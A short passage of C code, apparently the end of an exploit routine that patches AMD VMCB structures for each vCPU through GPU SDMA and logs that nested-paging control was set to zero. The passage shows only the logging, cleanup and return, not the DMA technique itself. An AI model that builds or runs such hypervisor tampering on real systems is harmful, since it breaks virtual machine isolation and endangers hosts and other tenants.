        patched++;
        printf("[VMCB] Patched vCPU %d: sysPA=0x%llx NP 0x%llx->0\n",
               i, (unsigned long long)vmcb_pa, (unsigned long long)np_ctrl);
    }

    bounce_free(&bounce);
    printf("[VMCB] Patched %d VMCBs via GPU SDMA\n", patched);
    return (patched > 0) ? 0 : -1;
}
